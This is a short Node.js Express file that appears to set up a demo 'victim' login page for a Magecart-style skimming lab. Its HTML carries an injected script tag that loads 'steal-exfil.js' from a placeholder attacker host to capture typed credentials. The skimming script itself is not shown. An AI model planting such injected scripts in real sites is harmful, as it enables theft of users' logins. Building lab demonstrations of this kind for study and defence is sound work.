const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send(`
    <html>
<head>
<title>login page</title>
</head>
      <body>
        <h2>Demo Login Page</h2>

        <form id="login">
          <input id="username" placeholder="Username" /><br><br>
          <input id="password" type="password" placeholder="Password" /><br><br>
          <button type="submit">Login</button>
        </form>

        <!- Magecart-style injected script -->
        <script src="http://<ypur-ec2-ip>:3000/steal-exfil.js"></script>

      </body>
    </html>
  `);
});

app.listen(80, () => {
  console.log("Victim running on port 80");
});
